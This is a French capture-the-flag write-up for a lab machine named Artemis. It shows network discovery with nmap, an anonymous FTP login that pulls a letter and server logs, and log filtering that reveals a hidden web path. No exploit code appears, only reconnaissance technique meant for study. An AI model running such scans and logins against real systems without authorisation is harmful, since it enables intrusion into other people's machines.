# 1. Découverte des services

Dans un premier temps, il faut récupérer notre IP afin de savoir quelle "range" scanner. *(on fait ça parce qu'on a mis la box Artemis en NAT)*

```bash
┌──(loullouw㉿kaliT)-[~]
└─$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:3e:63:6f brd ff:ff:ff:ff:ff:ff
    inet 192.168.17.130/24 brd 192.168.17.255 scope global dynamic noprefixroute eth0
       valid_lft 1642sec preferred_lft 1642sec
    inet6 fe80::20c:29ff:fe3e:636f/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

Notre ip `192.168.17.130/24` nous indique que le réseau à analyser est le suivant : `192.168.17.0/24`

On effectue ensuite un premier scan N**map** pour récupérer l'ip de la Box

```bash
┌──(loullouw㉿kaliT)-[~]
└─$ sudo nmap -sP 192.168.17.0/24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-28 20:10 CEST
Nmap scan report for 192.168.17.1
Host is up (0.00010s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.17.2
Host is up (0.00014s latency).
MAC Address: 00:50:56:FE:A5:36 (VMware)
Nmap scan report for 192.168.17.129
Host is up (0.00078s latency).
MAC Address: 00:0C:29:74:2B:99 (VMware)
Nmap scan report for 192.168.17.254
Host is up (0.00043s latency).
MAC Address: 00:50:56:E7:D9:BD (VMware)
Nmap scan report for 192.168.17.130
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.94 seconds
```

Dans les adresses récupérées :

- on ignore la .1 et .2 (parce que c'est comme ça)
- la .254 est l'adresse de broadcast
- la .130 est l'adresse de notre Kali
- `192.168.17.129` est donc l'adresse d'Artemis

Une fois celle-ci trouvée, il est temps maintenant de découvrir quels services tournent sur celle-ci

```bash
┌──(loullouw㉿kaliT)-[~]
└─$ sudo nmap -sV -p- -A 192.168.17.129
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-28 20:41 CEST
Nmap scan report for 192.168.17.129
Host is up (0.00055s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: TYPO3 4.5 CMS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title:  L'ESGI, la grande \xC3\xA9cole informatique \xC3\xA0 Paris de Bac \xC3\xA0 Bac+5
25452/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:e4:c3:c7:4f:8b:0e:a3:53:bc:7a:a6:0f:43:19:61 (RSA)
|   256 62:af:ab:21:35:75:f6:8f:99:3d:d5:eb:19:fe:43:0e (ECDSA)
|_  256 4a:3c:bb:38:8c:ef:4a:dd:19:26:47:67:11:04:60:fa (ED25519)
61337/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0             207 Mar 22 23:05 letters.txt
|_drwxr-xr-x    2 0        0            4096 Mar 23 01:15 logs
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.17.130
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
MAC Address: 00:0C:29:74:2B:99 (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.55 ms 192.168.17.129

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.24 seconds
```

Résultat, 3 services sont up.

## 1.1. `80` - Service HTTP (Apache)

Voilà ce qu'on obtient si on va sur l'url : [http://192.168.17.129:80](http://192.168.17.129:80)

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d739b7b6-2cc8-413b-b037-5b619bec3f98/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d739b7b6-2cc8-413b-b037-5b619bec3f98/Untitled.png)

## 1.2. `25452` - Service SSH

Si on tente une connexion au serveur SSH

```bash
┌──(loullouw㉿kaliT)-[~]
└─$ ssh root@192.168.17.129 -p 25452   
root@192.168.17.129's password:
```

On apprend qu'on pourra se connecter en root. à par ça, rien de transcendant.

## 1.3. `61337` - Service FTP

Si on tente une connexion au service FTP

```bash
┌──(loullouw㉿kaliT)-[~]
└─$ ftp                          
ftp> open 192.168.17.129 61337
Connected to 192.168.17.129.
220 ESGI file server. Login with myges credentials.
Name (192.168.17.129:loullouw): ftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Pour se connecter, on utilise `Name : ftp` comme indiqué plus haut dans le scan **Nmap,** et on récupère les fichiers.

```bash
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Mar 22 23:05 .
drwxr-xr-x    3 0        0            4096 Mar 22 23:05 ..
-rw-r--r--    1 0        0             207 Mar 22 23:05 letters.txt
drwxr-xr-x    2 0        0            4096 Mar 23 01:15 logs
226 Directory send OK.
ftp> get letters.txt 
local: letters.txt remote: letters.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for letters.txt (207 bytes).
226 Transfer complete.
207 bytes received in 0.00 secs (1.0021 MB/s)
ftp> cd /logs
250 Directory successfully changed.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Mar 23 01:15 .
drwxr-xr-x    3 0        0            4096 Mar 22 23:05 ..
-rw-r--r--    1 0        0           12172 Mar 22 23:04 access.log
-rw-r--r--    1 0        0            4881 Mar 23 01:15 auth.log
226 Directory send OK.
ftp> mget *
mget access.log? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for access.log (12172 bytes).
226 Transfer complete.
12172 bytes received in 0.00 secs (35.6077 MB/s)
mget auth.log? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for auth.log (4881 bytes).
226 Transfer complete.
4881 bytes received in 0.00 secs (16.6246 MB/s)
```

### 1.3.1. Les fichiers trouvés sur le FTP

- **letters.txt**

```
Salut Erwan,

J'ai déployé la nouvelle version du site web de l'école sur le serveur. Peux tu me dire ce que tu en penses stp ?
N'oublie pas de supprimer tes logs, ça traine pour rien.

Merci

K. Hennou
```

Zut alors ! des logs traineraient-ils ? Allons regarder ça !

- **logs/auth.log**

```
Mar 22 22:09:01 artemis CRON[2790]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 22 22:09:01 artemis CRON[2790]: pam_unix(cron:session): session closed for user root
Mar 22 22:17:01 artemis CRON[2931]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 22 22:17:01 artemis CRON[2931]: pam_unix(cron:session): session closed for user root
Mar 22 22:19:38 artemis gnome-keyring-daemon[2990]: failed to unlock login keyring on startup
Mar 22 22:19:42 artemis polkitd(authority=local): Registered Authentication Agent for unix-session:5 (system bus name :1.78 [/usr/bin/gnome-shell], object path /org/freedesktop/PolicyKit1/AuthenticationAgent, locale en_US.UTF-8)
Mar 22 22:20:04 artemis dbus-daemon[589]: [system] Failed to activate service 'org.bluez': timed out (service_start_timeout=25000ms)
Mar 22 22:20:51 artemis pkexec: pam_unix(polkit-1:session): session opened for user root by (uid=1000)
Mar 22 22:22:40 artemis chage[4052]: changed password expiry for sshd
Mar 22 22:22:44 artemis sshd[4136]: Server listening on 0.0.0.0 port 22.
Mar 22 22:22:44 artemis sshd[4136]: Server listening on :: port 22.
Mar 22 22:23:55 artemis pkexec: pam_unix(polkit-1:session): session opened for user root by (uid=1000)
Mar 22 22:26:09 artemis sshd[4136]: Received signal 15; terminating.
Mar 22 22:26:09 artemis sshd[6660]: Server listening on 0.0.0.0 port 25452.
Mar 22 22:26:53 artemis pkexec: pam_unix(polkit-1:session): session opened for user root by (uid=1000)
Mar 22 22:28:15 artemis passwd[9524]: pam_unix(passwd:chauthtok): password changed for root
Mar 22 22:28:15 artemis passwd[9524]: gkr-pam: couldn't update the login keyring password: no old password was entered
Mar 22 22:28:19 artemis sshd[7748]: Accepted password for root from 192.168.204.133 port 51388 ssh2
Mar 22 22:28:19 artemis sshd[7748]: pam_unix(sshd:session): session opened for user root by (uid=0)
Mar 22 22:28:19 artemis systemd: pam_unix(systemd-user:session): session opened for user root by (uid=0)
Mar 22 22:28:19 artemis systemd-logind[652]: New session 7 of user root.
Mar 22 22:28:48 artemis sshd[7748]: Exiting on signal 15
Mar 22 22:28:48 artemis sshd[7748]: pam_unix(sshd:session): session closed for user root
Mar 22 22:28:48 artemis sshd[7748]: pam_systemd(sshd:session): Failed to release session: Interrupted system call
Mar 22 22:30:32 artemis CRON[605]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 22 22:30:33 artemis CRON[605]: pam_unix(cron:session): session closed for user root
Mar 22 22:30:33 artemis systemd-logind[610]: Watching system buttons on /dev/input/event0 (Power Button)
Mar 22 22:30:33 artemis systemd-logind[610]: New seat seat0.
Mar 22 22:30:36 artemis sshd[713]: Received SIGHUP; restarting.
Mar 22 22:30:37 artemis sshd[713]: Received SIGHUP; restarting.
Mar 22 22:30:40 artemis systemd-logind[610]: Watching system buttons on /dev/input/event1 (AT Translated Set 2 keyboard)
Mar 22 22:30:46 artemis useradd[1069]: failed adding user 'vboxadd', data deleted
Mar 22 22:30:47 artemis useradd[1070]: failed adding user 'vboxadd', data deleted
Mar 22 22:30:48 artemis gdm-launch-environment]: pam_unix(gdm-launch-environment:session): session opened for user gdm by (uid=0)
Mar 22 22:30:48 artemis systemd-logind[610]: New session c1 of user gdm.
Mar 22 22:30:48 artemis systemd: pam_unix(systemd-user:session): session opened for user gdm by (uid=0)
Mar 22 22:30:54 artemis polkitd(authority=local): Registered Authentication Agent for unix-session:c1 (system bus name :1.29 [/usr/bin/gnome-shell], object path /org/freedesktop/PolicyKit1/AuthenticationAgent, locale en_US.UTF-8)
Mar 22 22:31:09 artemis sshd[1372]: pam_unix(sshd:session): session opened for user root by (uid=0)
Mar 22 22:31:09 artemis systemd: pam_unix(systemd-user:session): session opened for user root by (uid=0)
Mar 22 22:31:09 artemis systemd-logind[610]: New session 3 of user root.
Mar 22 22:31:16 artemis dbus-daemon[593]: [system] Failed to activate service 'org.bluez': timed out (service_start_timeout=25000ms)
Mar 22 22:39:01 artemis CRON[2083]: pam_unix(cron:session): session opened for user root by (uid=0)
Mar 22 22:39:01 artemis CRON[2083]: pam_unix(cron:session): session closed for user root
Mar 22 22:56:27 artemis groupadd[2708]: group added to /etc/group: name=ftp, GID=127
Mar 22 22:56:27 artemis groupadd[2708]: group added to /etc/gshadow: name=ftp
Mar 22 22:56:27 artemis groupadd[2708]: new group: name=ftp, GID=127
Mar 22 22:56:27 artemis useradd[2712]: new user: name=ftp, UID=123, GID=127, home=/srv/ftp, shell=/usr/sbin/nologin
Mar 22 22:56:27 artemis usermod[2718]: change user 'ftp' password
Mar 22 22:56:27 artemis chage[2723]: changed password expiry for ftp
Mar 22 22:56:27 artemis chfn[2726]: changed user 'ftp' information
Mar 22 22:57:50 artemis vsftpd: pam_unix(vsftpd:auth): check pass; user unknown
```

Un jolie bazar pour nous apprendre qu'on peut se connecter en root sur le serveur SSH, ce que l'on savait déjà.

- **logs/access.log**

```
192.168.204.133 - - [22/Mar/2021:22:16:43 +0300] "GET / HTTP/1.0" 200 433 "-" "-"
192.168.204.133 - - [22/Mar/2021:22:16:45 +0300] "GET /nmaplowercheck1616437005 HTTP/1.1" 404 457 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.204.133 - - [22/Mar/2021:22:16:45 +0300] "GET / HTTP/1.0" 200 433 "-" "-"
192.168.204.133 - - [22/Mar/2021:22:16:45 +0300] "GET /nmaplowercheck1616437006 HTTP/1.1" 404 457 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.204.133 - - [22/Mar/2021:22:16:45 +0300] "POST /sdk HTTP/1.1" 404 457 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.204.133 - - [22/Mar/2021:22:16:46 +0300] "GET /evox/about HTTP/1.1" 404 457 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.204.133 - - [22/Mar/2021:22:16:46 +0300] "GET /HNAP1 HTTP/1.1" 404 457 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.204.133 - - [22/Mar/2021:22:16:50 +0300] "GET / HTTP/1.0" 200 433 "-" "-"
192.168.204.133 - - [22/Mar/2021:22:16:50 +0300] "GET / HTTP/1.1" 200 414 "-" "-"
192.168.204.133 - - [22/Mar/2021:22:23:49 +0300] "GET / HTTP/1.1" 200 446 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:23:50 +0300] "GET /robots.txt HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:23:50 +0300] "GET /favicon.ico HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:37:16 +0300] "GET / HTTP/1.1" 200 24301 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:37:16 +0300] "GET /xjs/_/js/k=xjs.s.fr.E7-94xl0C6g.O/ck=xjs.s.Bb5PNo8uoLU.L.F4.O/m=cdos,cr,dpf,hsm,jsa,d,csi/am=MIAAACCCAgIAAACAAggrAwKAeAAgIAIASQAAAABgAmsAgP8gAHDBJQ4AAAAAgAC0JNAoNSAREAABAACArC6UAAEABA/d=1/dg=2/ct=zgms/rs=ACT90oE0c10l85r1zz8Z3xngXg8kFxrkpg?cb=4519958 HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:37:16 +0300] "GET /favicon.ico HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:37:17 +0300] "GET / HTTP/1.1" 200 24301 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:37:17 +0300] "GET /xjs/_/js/k=xjs.s.fr.E7-94xl0C6g.O/ck=xjs.s.Bb5PNo8uoLU.L.F4.O/m=cdos,cr,dpf,hsm,jsa,d,csi/am=MIAAACCCAgIAAACAAggrAwKAeAAgIAIASQAAAABgAmsAgP8gAHDBJQ4AAAAAgAC0JNAoNSAREAABAACArC6UAAEABA/d=1/dg=2/ct=zgms/rs=ACT90oE0c10l85r1zz8Z3xngXg8kFxrkpg?cb=4519958 HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:37:17 +0300] "GET /favicon.ico HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:39:16 +0300] "GET / HTTP/1.1" 200 8704 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:39:16 +0300] "GET /_static/js/playback.bundle.js?v=bQvHU8mx HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:39:16 +0300] "GET /_static/js/wombat.js?v=cRqOKCOw HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:39:16 +0300] "GET /_static/css/banner-styles.css?v=bsmaklHF HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:39:16 +0300] "GET /_static/css/iconochive.css?v=qtvMKcIJ HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:39:17 +0300] "GET /_static/js/playback.bundle.js?v=bQvHU8mx HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:39:17 +0300] "GET /_static/js/wombat.js?v=cRqOKCOw HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:39:17 +0300] "GET /_static/css/banner-styles.css?v=bsmaklHF HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:39:17 +0300] "GET /_static/css/iconochive.css?v=qtvMKcIJ HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:39:19 +0300] "GET /_static/images/toolbar/wm_tb_prv_on.png HTTP/1.1" 404 494 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:39:19 +0300] "GET /_static/images/toolbar/wayback-toolbar-logo-100.png HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:39:19 +0300] "GET /_static/images/loading.gif HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:39:19 +0300] "GET /_static/images/toolbar/wm_tb_nxt_on.png HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:39:22 +0300] "GET /_static/images/toolbar/wm_tb_prv_on.png HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:39:22 +0300] "GET /_static/images/toolbar/wm_tb_nxt_on.png HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:39:22 +0300] "GET /_static/images/toolbar/wayback-toolbar-logo-100.png HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:39:22 +0300] "GET /_static/images/loading.gif HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:39:42 +0300] "GET /aa HTTP/1.1" 404 494 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:42:42 +0300] "GET / HTTP/1.1" 200 8704 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:42:42 +0300] "GET /_static/images/toolbar/wayback-toolbar-logo-100.png HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:42:42 +0300] "GET /_static/images/toolbar/wm_tb_prv_on.png HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:42:42 +0300] "GET /_static/images/toolbar/wm_tb_nxt_on.png HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:42:42 +0300] "GET /_static/images/loading.gif HTTP/1.1" 404 494 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:42:42 +0300] "GET /_static/js/playback.bundle.js?v=bQvHU8mx HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:56:00 +0300] "GET /0cdb312366ecf1f493bc83f0fb56adda28125498762f28f1cc40c320300125ce/ HTTP/1.1" 200 444 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:42:42 +0300] "GET /_static/js/wombat.js?v=cRqOKCOw HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:42:42 +0300] "GET /_static/css/banner-styles.css?v=bsmaklHF HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:42:42 +0300] "GET /_static/css/iconochive.css?v=qtvMKcIJ HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:43:07 +0300] "GET /_static/images/toolbar/wm_tb_prv_on.png HTTP/1.1" 404 494 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:43:07 +0300] "GET /_static/images/toolbar/wm_tb_nxt_on.png HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:43:07 +0300] "GET /_static/images/loading.gif HTTP/1.1" 404 494 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:43:07 +0300] "GET /_static/images/toolbar/wayback-toolbar-logo-100.png HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:44:32 +0300] "GET / HTTP/1.1" 200 11082 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:44:32 +0300] "GET /_static/js/playback.bundle.js?v=bQvHU8mx HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:44:32 +0300] "GET /_static/js/wombat.js?v=cRqOKCOw HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:44:32 +0300] "GET /_static/css/banner-styles.css?v=bsmaklHF HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:44:32 +0300] "GET /_static/css/iconochive.css?v=qtvMKcIJ HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:44:34 +0300] "GET /_static/js/playback.bundle.js?v=bQvHU8mx HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:44:34 +0300] "GET /_static/js/wombat.js?v=cRqOKCOw HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:44:34 +0300] "GET / HTTP/1.1" 200 11081 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:44:34 +0300] "GET /_static/js/playback.bundle.js?v=bQvHU8mx HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:44:34 +0300] "GET /_static/js/wombat.js?v=cRqOKCOw HTTP/1.1" 404 494 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:44:34 +0300] "GET /_static/css/banner-styles.css?v=bsmaklHF HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:44:34 +0300] "GET /_static/css/iconochive.css?v=qtvMKcIJ HTTP/1.1" 404 493 "http://192.168.204.134/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:45:16 +0300] "GET /aa HTTP/1.1" 404 494 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
```

Pleins de requêtes **GET** mais avec un statut `404` ne nous avancent pas à grand chose.

Au contraire, si on filtre uniquement sur les requêtes avec un statut `200` :

```bash
┌──(loullouw㉿kaliT)-[~]
└─$ cat access.log | grep 200
192.168.204.133 - - [22/Mar/2021:22:16:43 +0300] "GET / HTTP/1.0" 200 433 "-" "-"
192.168.204.133 - - [22/Mar/2021:22:16:45 +0300] "GET / HTTP/1.0" 200 433 "-" "-"
192.168.204.133 - - [22/Mar/2021:22:16:50 +0300] "GET / HTTP/1.0" 200 433 "-" "-"
192.168.204.133 - - [22/Mar/2021:22:16:50 +0300] "GET / HTTP/1.1" 200 414 "-" "-"
192.168.204.133 - - [22/Mar/2021:22:23:49 +0300] "GET / HTTP/1.1" 200 446 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:37:16 +0300] "GET / HTTP/1.1" 200 24301 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:37:17 +0300] "GET / HTTP/1.1" 200 24301 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:39:16 +0300] "GET / HTTP/1.1" 200 8704 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:42:42 +0300] "GET / HTTP/1.1" 200 8704 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:56:00 +0300] "GET /0cdb312366ecf1f493bc83f0fb56adda28125498762f28f1cc40c320300125ce/ HTTP/1.1" 200 444 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.204.133 - - [22/Mar/2021:22:44:32 +0300] "GET / HTTP/1.1" 200 11082 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
